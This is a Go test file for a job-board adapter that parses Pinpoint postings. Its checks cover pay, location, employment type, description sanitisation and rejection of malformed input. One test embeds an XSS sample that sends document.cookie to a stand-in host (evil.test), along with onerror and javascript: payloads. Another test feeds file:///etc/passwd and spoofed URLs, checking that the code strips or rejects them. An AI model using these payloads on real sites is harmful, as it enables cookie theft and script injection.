package pinpoint

import (
	"context"
	"errors"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/bharathvbcr/Vani/internal/jobinsight"
	"github.com/bharathvbcr/Vani/internal/posting"
	"github.com/bharathvbcr/Vani/internal/sources"
	"github.com/bharathvbcr/Vani/internal/sources/srctest"
	"github.com/bharathvbcr/Vani/internal/sources/srcutil"
)

var fixedNow = time.Date(2026, 10, 27, 9, 0, 0, 0, time.UTC)

const boardEndpoint = "https://workwithus.pinpointhq.com/postings.json"

var board = sources.Board{ATS: posting.Pinpoint, Token: "workwithus", Company: "Pinpoint"}

func newSource(body string) (*source, *srctest.Doer) {
	d := srctest.New(map[string]srctest.Reply{boardEndpoint: {Status: 200, Body: []byte(body)}})
	return &source{d: d, now: func() time.Time { return fixedNow }}, d
}

func list(t *testing.T, body string) []posting.Posting {
	t.Helper()
	s, _ := newSource(body)
	got, err := s.List(context.Background(), board)
	if err != nil {
		t.Fatal(err)
	}
	return got
}

// itemJSON is one valid posting with extra fields appended.
func itemJSON(id, extra string) string {
	return `{"id":"` + id + `","title":"T","url":"https://workwithus.pinpointhq.com/en/postings/` + id + `"` + extra + `}`
}

func data(items ...string) string { return `{"data":[` + strings.Join(items, ",") + `]}` }

func TestFixture(t *testing.T) {
	raw, err := os.ReadFile("testdata/board.json")
	if err != nil {
		t.Fatal(err)
	}
	got := list(t, string(raw))
	want := []struct {
		p      posting.Posting
		prefix string
	}{
		{posting.Posting{
			Key: "pp:workwithus:559663", ATS: posting.Pinpoint, Company: "Pinpoint",
			Title: "Founding Legal Counsel", Location: "London", Department: "Operations", Remote: true,
			URL: "https://workwithus.pinpointhq.com/en/postings/ce6c9e5c-a2d3-42b0-a01e-9edeae315b04", SeenAt: fixedNow,
		}, "Role: full-time, remote\n\nHi 👋 I'm Ellis, COO at Pinpoint."},
		{posting.Posting{
			Key: "pp:workwithus:567495", ATS: posting.Pinpoint, Company: "Pinpoint",
			Title: "Enterprise Implementation Manager", Location: "London", Department: "Implementation", Remote: true,
			URL: "https://workwithus.pinpointhq.com/en/postings/8fa6a0e0-0beb-4233-8ab0-409fe6bfccb1", SeenAt: fixedNow,
		}, "Pay range: GBP 70000 – 90000 per year\nRole: full-time, remote\n\n"},
	}
	if len(got) != 3 {
		t.Fatalf("got %d postings, want 3", len(got))
	}
	for i, w := range want {
		g := got[i]
		desc := g.Description
		g.Description = ""
		if g != w.p {
			t.Errorf("posting %d\n got %+v\nwant %+v", i, g, w.p)
		}
		if !strings.HasPrefix(desc, w.prefix) {
			t.Errorf("posting %d description starts %.120q, want prefix %q", i, desc, w.prefix)
		}
		if strings.ContainsAny(desc, "<>") || len(desc) > srcutil.MaxDescription {
			t.Errorf("posting %d description carries markup or is %d bytes", i, len(desc))
		}
		// Every part follows under the title the board gave it.
		for _, h := range []string{"What you'll do\n", "What you'll bring\n", "What we offer\n"} {
			if !strings.Contains(desc, "\n\n"+h) {
				t.Errorf("posting %d description lacks the %q part", i, strings.TrimSpace(h))
			}
		}
	}
	pays := jobinsight.PostingPay(got[1])
	if len(pays) == 0 || pays[0].Currency != "GBP" || pays[0].Period != jobinsight.Year || pays[0].Min != 70000 || pays[0].Max != 90000 {
		t.Fatalf("pay read back %+v", pays)
	}
	if p := jobinsight.PostingPay(got[0]); len(p) != 0 {
		t.Fatalf("a posting that shows no pay read as %+v", p)
	}
	if (&source{}).ATS() != posting.Pinpoint {
		t.Fatal("ATS")
	}
}

func TestOneRequestToTheTenantHost(t *testing.T) {
	s, d := newSource(data(itemJSON("1", "")))
	if _, err := s.List(context.Background(), board); err != nil {
		t.Fatal(err)
	}
	if u := d.URLs(); len(u) != 1 || u[0] != boardEndpoint {
		t.Fatalf("requested %v, want exactly %s", u, boardEndpoint)
	}
}

func TestPay(t *testing.T) {
	for name, tc := range map[string]struct{ extra, line string }{
		"structured":        {`"compensation_visible":true,"compensation_minimum":70000.0,"compensation_maximum":90000.0,"compensation_currency":"gbp","compensation_frequency":"year"`, "Pay range: GBP 70000 – 90000 per year"},
		"monthly":           {`"compensation_visible":true,"compensation_minimum":3000,"compensation_maximum":4000,"compensation_currency":"EUR","compensation_frequency":"month"`, "Pay range: EUR 3000 – 4000 per month"},
		"numeric strings":   {`"compensation_visible":true,"compensation_minimum":" 50000 ","compensation_maximum":"60000.5","compensation_currency":"USD","compensation_frequency":"year"`, "Pay range: USD 50000 – 60000.5 per year"},
		"only a minimum":    {`"compensation_visible":true,"compensation_minimum":40,"compensation_maximum":null,"compensation_currency":"USD","compensation_frequency":"hour"`, "Pay range: USD 40 per hour"},
		"text fallback":     {`"compensation_visible":true,"compensation":"£70,000 - £90,000 / year","compensation_minimum":null,"compensation_maximum":null`, "Compensation: £70,000 - £90,000 / year"},
		"junk amounts":      {`"compensation_visible":true,"compensation":"Competitive","compensation_minimum":"lots","compensation_maximum":true,"compensation_currency":"USD","compensation_frequency":"year"`, "Compensation: Competitive"},
		"junk, no text":     {`"compensation_visible":true,"compensation_minimum":"lots","compensation_maximum":[1],"compensation_currency":"USD"`, ""},
		"hidden is hidden":  {`"compensation_visible":false,"compensation":"£1 - £2","compensation_minimum":70000,"compensation_maximum":90000,"compensation_currency":"GBP","compensation_frequency":"year"`, ""},
		"no currency":       {`"compensation_visible":true,"compensation_minimum":70000,"compensation_maximum":90000`, ""},
		"min above max":     {`"compensation_visible":true,"compensation_minimum":90000,"compensation_maximum":70000,"compensation_currency":"GBP"`, ""},
		"negative":          {`"compensation_visible":true,"compensation_minimum":-1,"compensation_maximum":-2,"compensation_currency":"GBP"`, ""},
		"zero":              {`"compensation_visible":true,"compensation_minimum":0,"compensation_maximum":0,"compensation_currency":"GBP"`, ""},
		"all null":          {`"compensation_visible":true,"compensation":null,"compensation_minimum":null,"compensation_maximum":null,"compensation_currency":null,"compensation_frequency":null`, ""},
		"visible is a text": {`"compensation_visible":"yes"`, "!"},
	} {
		t.Run(name, func(t *testing.T) {
			s, _ := newSource(data(itemJSON("1", ","+tc.extra)))
			got, err := s.List(context.Background(), board)
			if tc.line == "!" {
				if err == nil {
					t.Fatal("a text where a flag belongs was accepted")
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			first, _, _ := strings.Cut(got[0].Description, "\n")
			if tc.line == "" {
				if strings.HasPrefix(got[0].Description, srcutil.PayLinePrefix) || strings.HasPrefix(got[0].Description, srcutil.CompensationPrefix) {
					t.Fatalf("a pay line came out: %q", first)
				}
				return
			}
			if first != tc.line {
				t.Fatalf("first line %q, want %q", first, tc.line)
			}
		})
	}
}

func TestWorkSiteAndEmployment(t *testing.T) {
	for name, tc := range map[string]struct {
		extra, want string
		remote      bool
	}{
		"remote":           {`,"workplace_type":"remote","employment_type_text":"Full Time"`, "Role: full-time, remote\n\n", true},
		"hybrid":           {`,"workplace_type":"hybrid","employment_type_text":"Part Time"`, "Role: part-time, hybrid\n\n", false},
		"onsite":           {`,"workplace_type":"onsite"`, "Role: on-site\n\n", false},
		"case and padding": {`,"workplace_type":" Remote "`, "Role: remote\n\n", true},
		"unknown site":     {`,"workplace_type":"moon","employment_type_text":"Internship"`, "Role: internship\n\n", false},
		"code fallback":    {`,"employment_type":"fixed_term_contract"`, "Role: fixed term contract\n\n", false},
		"permanent code":   {`,"employment_type":"permanent_full_time"`, "Role: permanent full time\n\n", false},
		"text wins":        {`,"employment_type":"contract","employment_type_text":"Freelance"`, "Role: Freelance\n\n", false},
		"none":             {``, "", false},
		"nulls":            {`,"workplace_type":null,"employment_type":null`, "", false},
	} {
		got := list(t, data(itemJSON("1", tc.extra)))
		if got[0].Description != tc.want || got[0].Remote != tc.remote {
			t.Errorf("%s: description %q remote %v, want %q %v", name, got[0].Description, got[0].Remote, tc.want, tc.remote)
		}
	}
}

func TestLocation(t *testing.T) {
	for name, tc := range map[string]struct{ extra, want string }{
		"city and province": {`,"location":{"city":"Pittsburgh","province":"PA","name":"Pittsburgh, PA, US"}`, "Pittsburgh, PA"},
		"same twice":        {`,"location":{"city":"London","province":"London","name":"Remote"}`, "London"},
		"name only":         {`,"location":{"city":null,"province":null,"name":"Remote"}`, "Remote"},
		"blank structured":  {`,"location":{"city":" ","province":"","name":" Remote "}`, "Remote"},
		"no location":       {``, ""},
		"null location":     {`,"location":null`, ""},
		"empty object":      {`,"location":{}`, ""},
		"unicode":           {`,"location":{"city":"Zürich","province":"ZH","name":""}`, "Zürich, ZH"},
	} {
		got := list(t, data(itemJSON("1", tc.extra)))
		if got[0].Location != tc.want {
			t.Errorf("%s: location %q, want %q", name, got[0].Location, tc.want)
		}
	}
}

func TestDepartment(t *testing.T) {
	for name, tc := range map[string]struct{ extra, want string }{
		"named":           {`,"job":{"department":{"name":"  Operations "}}`, "Operations"},
		"null department": {`,"job":{"department":null}`, ""},
		"no job":          {``, ""},
		"null job":        {`,"job":null`, ""},
		"entity":          {`,"job":{"department":{"name":"R&amp;D"}}`, "R&D"},
	} {
		got := list(t, data(itemJSON("1", tc.extra)))
		if got[0].Department != tc.want {
			t.Errorf("%s: department %q, want %q", name, got[0].Department, tc.want)
		}
	}
}

func TestSectionsAndHTMLInjection(t *testing.T) {
	const evil = `<p>Real text</p><script>fetch('https://evil.test/?'+document.cookie)</script>` +
		`<img src=x onerror="alert(1)"><style>body{display:none}</style><!--block-->` +
		`<a href="javascript:alert(1)">click</a>&lt;script&gt;alert(2)&lt;/script&gt;`
	body := data(itemJSON("1", `,"description":`+fmt.Sprintf("%q", evil)+
		`,"key_responsibilities":"<ul><li>One</li><li>Two</li></ul>","key_responsibilities_header":"What you'll do <script>x</script>"`+
		`,"skills_knowledge_expertise":"","skills_knowledge_expertise_header":"What you'll bring"`+
		`,"benefits":"<p>Tea</p>","benefits_header":null`))
	d := list(t, body)[0].Description
	for _, bad := range []string{"fetch(", "evil.test/?", "onerror", "display:none", "<img", "block"} {
		if strings.Contains(d, bad) {
			t.Errorf("description kept %q: %q", bad, d)
		}
	}
	want := "Real text\nclick<script>alert(2)</script>\n\nWhat you'll do\nOne\nTwo\n\nTea"
	if d != want {
		t.Errorf("description %q, want %q", d, want)
	}
	if strings.Contains(d, "What you'll bring") {
		t.Error("an empty part kept its heading")
	}
}

func TestDescriptionCapKeepsTheLead(t *testing.T) {
	huge := strings.Repeat("lorem ", 100<<10/6)
	got := list(t, data(itemJSON("1", `,"employment_type_text":"Full Time","workplace_type":"remote","compensation_visible":true,"compensation_minimum":1,"compensation_maximum":2,"compensation_currency":"USD","compensation_frequency":"year","description":"<p>`+huge+`</p>","benefits":"<p>`+huge+`</p>"`)))
	d := got[0].Description
	if n := len(d); n == 0 || n > srcutil.MaxDescription {
		t.Fatalf("description %d bytes, want 1..%d", n, srcutil.MaxDescription)
	}
	if !strings.HasPrefix(d, "Pay range: USD 1 – 2 per year\nRole: full-time, remote\n\n") {
		t.Fatalf("lead cut: %.80q", d)
	}
}

func TestMissingAndHostileFields(t *testing.T) {
	for name, body := range map[string]string{
		"missing id":          `{"data":[{"title":"T","url":"https://workwithus.pinpointhq.com/p"}]}`,
		"blank id":            `{"data":[{"id":" ","title":"T","url":"https://workwithus.pinpointhq.com/p"}]}`,
		"id with separator":   `{"data":[{"id":"a:b","title":"T","url":"https://workwithus.pinpointhq.com/p"}]}`,
		"numeric id":          `{"data":[{"id":5,"title":"T","url":"https://workwithus.pinpointhq.com/p"}]}`,
		"missing title":       `{"data":[{"id":"1","url":"https://workwithus.pinpointhq.com/p"}]}`,
		"blank title":         `{"data":[{"id":"1","title":"   ","url":"https://workwithus.pinpointhq.com/p"}]}`,
		"missing url":         `{"data":[{"id":"1","title":"T"}]}`,
		"file url":            `{"data":[{"id":"1","title":"T","url":"file:///etc/passwd"}]}`,
		"javascript url":      `{"data":[{"id":"1","title":"T","url":"javascript:alert(1)"}]}`,
		"userinfo url":        `{"data":[{"id":"1","title":"T","url":"https://workwithus.pinpointhq.com@evil.test/p"}]}`,
		"relative url":        `{"data":[{"id":"1","title":"T","url":"/en/postings/1"}]}`,
		"data is an object":   `{"data":{"1":{}}}`,
		"data is a string":    `{"data":"none"}`,
		"element is a number": `{"data":[1]}`,
		"title is a number":   `{"data":[{"id":"1","title":5,"url":"https://workwithus.pinpointhq.com/p"}]}`,
		"body is an array":    `{"data":[{"id":"1","title":"T","url":"https://workwithus.pinpointhq.com/p","description":["x"]}]}`,
		"one bad among good":  `{"data":[` + itemJSON("1", "") + `,{"id":"2","title":"T"}]}`,
	} {
		t.Run(name, func(t *testing.T) {
			s, _ := newSource(body)
			if got, err := s.List(context.Background(), board); err == nil {
				t.Fatalf("want an error, got %d postings", len(got))
			}
		})
	}
}

func TestPayloadsThatAreNotABoard(t *testing.T) {
	for name, body := range map[string]string{
		"empty body": ``, "null": `null`, "no data key": `{}`, "data null": `{"data":null}`,
		"array": `[]`, "html": `<html><body>Not found</body></html>`, "truncated": `{"data":[{"id":"1"`,
		"error object": `{"error":"not found"}`,
	} {
		s, _ := newSource(body)
		if got, err := s.List(context.Background(), board); err == nil {
			t.Errorf("%s: want an error, got %d postings", name, len(got))
		}
	}
	s, _ := newSource(`{"data":[]}`)
	if got, err := s.List(context.Background(), board); err != nil || got == nil || len(got) != 0 {
		t.Fatalf("empty board: %#v, %v", got, err)
	}
}

func TestDuplicateIDsAreAnError(t *testing.T) {
	for name, body := range map[string]string{
		"same id":   data(itemJSON("7", ""), itemJSON("7", "")),
		"case only": data(itemJSON("AbC", ""), itemJSON("aBc", "")),
		"padded":    data(itemJSON("7", ""), strings.Replace(itemJSON("7", ""), `"id":"7"`, `"id":" 7 "`, 1)),
	} {
		s, _ := newSource(body)
		got, err := s.List(context.Background(), board)
		if err == nil || got != nil || !strings.Contains(err.Error(), "share key") {
			t.Errorf("%s: got %v, %v", name, got, err)
		}
	}
}

func TestUnicodeTitleIsCleaned(t *testing.T) {
	got := list(t, data(strings.Replace(itemJSON("1", ""), `"title":"T"`, `"title":"  Ingénieur Logiciel – 日本語 &amp; Co  "`, 1)))
	if got[0].Title != "Ingénieur Logiciel – 日本語 & Co" {
		t.Fatalf("title %q", got[0].Title)
	}
}

func TestStatusAndGone(t *testing.T) {
	for _, tc := range []struct {
		status int
		gone   bool
	}{{404, true}, {410, false}, {429, false}, {500, false}, {502, false}, {503, false}, {301, false}, {302, false}} {
		d := srctest.New(map[string]srctest.Reply{boardEndpoint: {Status: tc.status, Body: []byte(`{"data":[]}`), Header: map[string][]string{"Retry-After": {"0"}}}})
		s := &source{d: d, now: time.Now}
		got, err := s.List(context.Background(), board)
		if err == nil || got != nil || errors.Is(err, ErrBoardNotFound) != tc.gone {
			t.Errorf("status %d: got %v, %v (gone want %v)", tc.status, got, err, tc.gone)
		}
	}
}
